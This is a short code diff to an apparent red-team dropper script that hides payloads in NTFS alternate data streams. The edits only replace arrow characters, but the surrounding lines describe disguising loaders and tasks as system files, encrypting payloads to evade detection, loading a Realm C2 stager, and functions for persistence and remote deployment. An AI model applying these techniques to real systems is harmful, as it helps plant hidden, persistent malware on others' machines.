@@ -177,7 +177,7 @@ ENCRYPTION:
 Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
 RANDOMIZATION:
 -Randomize generates unique artifacts per deployment:
-File: SystemCache.dat → CacheSvc.log Stream: :syc_payload → :SmartScreen or :Zone.Identifier Loader: app_log_a.vbs → app_log_kqmxyz.vbs Task: UsbCeip → a3f5b2c1-... (GUID)
+File: SystemCache.dat -> CacheSvc.log Stream: :syc_payload -> :SmartScreen or :Zone.Identifier Loader: app_log_a.vbs -> app_log_kqmxyz.vbs Task: UsbCeip -> a3f5b2c1-... (GUID)
 C2 FRAMEWORK EXAMPLES:
 Realm C2 (Imix agent)
 $imix = Get-Content .\imix_stager.txt -Raw .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize
@@ -439,7 +439,7 @@ function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
         }
         default { Write-Warning "Unknown persistence: $Type" }
     }
-    Write-Host "Persist [$Type] → $LoaderPath" -ForegroundColor Yellow
+    Write-Host "Persist [$Type] -> $LoaderPath" -ForegroundColor Yellow
 }
 
 function Invoke-RemoteDeployment($Target, $PayloadObj, $PersistList, $RandomizeFlag, $EncryptFlag, $NoExecFlag, $Cred) {
